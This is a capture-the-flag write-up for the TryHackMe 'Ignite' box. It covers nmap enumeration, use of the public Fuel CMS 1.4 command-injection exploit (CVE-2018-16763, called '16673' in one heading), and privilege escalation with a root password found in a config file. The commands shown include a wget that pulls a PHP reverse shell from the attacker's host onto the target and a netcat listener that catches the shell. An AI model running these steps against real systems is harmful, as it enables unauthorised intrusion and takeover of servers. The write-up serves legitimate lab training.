# Try Hack Me - Ignite

**Categories:**  CTF, boot2root, privesc, exploit  
**Difficulty:**  Easy  

Commands used in this guide use the exported variable $IP (`export IP=10.10.224.219`) in place of the target machine's IP address.

## 1: Enumeration - nmap

Having launched the machine, we perform a basic TCP port scan with nmap (`sudo nmap $IP -p-`) followed by a version enumeration scan on the 1 discovered port (80) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/ignite]
└─$ sudo nmap $IP -sV -p80 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 23:36 EDT
Nmap scan report for 10.10.224.219
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

A Google / Searchsploit scan shows no relevant exploits for this Apache version. Navigating to the application on 80 reveals a [Fuel CMS](https://www.getfuelcms.com/) v1.4 welcome page, including default creds "admin:admin" :

```html
<header class="page_header">
    <div class="logo"><svg width="140px" height="165px" viewBox="0 0 126.962 115.395" preserveAspectRatio="xMidYMid"><use xlink:href="#fuel"></use></svg></div>
    
    <h1>Welcome to Fuel CMS</h1>
    <h2>Version 1.4</h2>
</header>
...snip...
<div class="content_block">
    <h4>That's it!</h4>

    <p>To access the FUEL admin, go to:<br/>
    <a href="http://10.10.224.219/fuel">http://10.10.224.219/fuel</a><br>
    User name: <strong>admin</strong><br/>
    Password: <strong>admin</strong> (you can and should change this password and admin user information after logging in)</p>
</div>
```

Normally we'd now start on further enumeration of the web application (gobuster, etc.), but in this case searchsploit throws up a critical vulnerability.

## 2. Foothold - CVE-2018-16673

A searchsploit search for Fuel 1.4 provides an exploit script for [CVE-2018-16763](https://www.exploit-db.com/exploits/47138), a command injection vulnerability providing RCE through a crafted query param at `/fuel/pages/select/?filter=`. We copy the script to our working directory, change the IP in the "url" variable, remove the "proxies=proxy" param in the call to requests.get (we don't need it here) and run the script. The script waits for user input that is urlencoded and injected into the vulnerable path : 

```console
┌──(kali㉿kali)-[/tmp/dead]
└─python2 47138.py
cmd:
```

Normally, we'd just pass a reverse shell here, but I had no luck with bash / netcat / python / php reverse shells, so I took the long way round. I downloaded a php reverse shell to the attack machine, hosted in over HTTP, and used the shell provided by the script to download it to `/var/www/html/exploit.php` using wget :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ python2 47138.py
cmd:wget 10.6.76.88/rs.php -O /var/www/html/exploit.php
```

We then start a netcat listener on the target port and navigate to the new `/exploit.php` route : 

```console
┌──(kali㉿kali)-[~]
└─$ curl $IP/exploit.php
```

```console
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 12321
listening on [any] 12321 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.224.219] 39236
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:13:29 up  1:49,  0 users,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The user flag is at `/home/www-data/flag.txt` - we'll also upgrade our shell to a tty (`python3 -c 'import pty; pty.spawn("/bin/bash")`).

## 3. Privesc - Root password in configs

The classic privesc vector when exploiting PHP CMS applications is plaintext credentials stored in application and database configuration files. Navigating to `/var/www/html/fuel` provides various possible paths for config files :

```console
www-data@ubuntu:/var/www/html/fuel$ ls
application  data_backup  install   modules
codeigniter  index.php    licenses  scripts
```

After a few minutes of poking around, we find a plaintext root password for the MySql instance in `/var/www/html/fuel/application/config/database.php` :

```php
...snip...
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'PASSWORD',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
...snip...
```

and we try to switch to the root user using the same password :

```console
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
Password:

root@ubuntu:/var/www/html/fuel/application/config# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`.
